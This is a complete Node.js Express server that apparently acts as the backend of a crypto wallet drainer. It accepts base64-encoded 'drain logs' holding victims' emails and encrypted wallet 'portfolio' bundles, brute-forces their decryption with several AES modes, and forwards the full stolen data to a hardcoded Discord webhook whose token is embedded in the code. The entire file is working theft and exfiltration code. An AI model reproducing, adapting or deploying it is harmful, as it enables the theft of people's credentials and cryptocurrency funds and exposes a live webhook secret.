const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";

app.use(express.raw({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

app.get('/data/:payload', async (req, res) => {
    try {
        const encoded = req.params.payload;
        const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
        let data = JSON.parse(decodedStr);

        console.log("✅ Raw log received from:", data.site);

        // Decrypt
        if (data.portfolio) {
            data.portfolio = decryptPortfolio(data.portfolio);
        }

        // Send to Discord with more info
        await sendToDiscord(data);

        res.status(200).send('OK');
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(400).send('Bad Request');
    }
});

function decryptPortfolio(portfolio) {
    const bundleKeyB64 = portfolio.bundleKey;
    if (!bundleKeyB64) {
        portfolio.decryption_note = "No bundleKey found";
        return portfolio;
    }

    portfolio.bundleKeyLength = bundleKeyB64.length;

    // Decrypt sBundles
    if (portfolio.sBundles) {
        try {
            const bundles = JSON.parse(portfolio.sBundles);
            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
        } catch (e) {
            portfolio.sBundlesDecrypted = { error: e.message };
        }
    }

    // Decrypt eBundles
    if (portfolio.eBundles) {
        try {
            const bundles = JSON.parse(portfolio.eBundles);
            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
        } catch (e) {
            portfolio.eBundlesDecrypted = { error: e.message };
        }
    }

    return portfolio;
}

function decryptSingleBundle(bundleStr, bundleKeyB64) {
    if (!bundleStr.includes(':')) return { raw: bundleStr };

    const [prefix, encryptedPart] = bundleStr.split(':', 2);
    const result = tryDecryptAES(encryptedPart, bundleKeyB64);

    if (result.success) {
        try {
            return { prefix, data: JSON.parse(result.decrypted) };
        } catch (e) {
            return { prefix, decrypted_raw: result.decrypted };
        }
    } else {
        return { prefix, error: result.error, raw_encrypted: encryptedPart };
    }
}

function tryDecryptAES(encryptedB64, keyB64) {
    const key = Buffer.from(keyB64, 'base64');

    const attempts = [
        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0) },
        { name: "CBC-KeyIV",  mode: 'aes-256-cbc', iv: key.slice(0, 16) },
        { name: "CBC-EmptyIV", mode: 'aes-256-cbc', iv: Buffer.alloc(16) },
        { name: "ECB", mode: 'aes-256-ecb', iv: null },
        { name: "CBC-KeyFull", mode: 'aes-256-cbc', iv: key },
    ];

    for (const attempt of attempts) {
        try {
            let decipher;
            if (attempt.iv === null) {
                decipher = crypto.createDecipher(attempt.mode, key);
            } else {
                decipher = crypto.createDecipheriv(attempt.mode, key, attempt.iv);
            }

            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
            decrypted += decipher.final('utf8');

            return { success: true, decrypted, method: attempt.name };
        } catch (e) {}
    }

    return { success: false, error: "All methods failed" };
}

async function sendToDiscord(data) {
    const embed = {
        title: "📥 New Axiom Log",
        color: 0xFF0000,
        fields: [
            { name: "Email", value: data.user?.email || "N/A", inline: true },
            { name: "Site", value: data.site || "N/A", inline: true },
            { name: "Decryption", value: data.portfolio?.sBundlesDecrypted?.[0]?.error ? "❌ Failed" : "✅ Success", inline: true }
        ]
    };

    try {
        await axios.post(DISCORD_WEBHOOK, {
            content: "**New Drain Log Received**",
            embeds: [embed],
            files: [{
                attachment: Buffer.from(JSON.stringify(data, null, 2), 'utf-8'),
                name: `full_log_${Date.now()}.json`
            }]
        });
    } catch (err) {
        console.error("Discord error:", err.message);
    }
}

app.listen(PORT, () => console.log(`🚀 Backend running on port ${PORT}`));
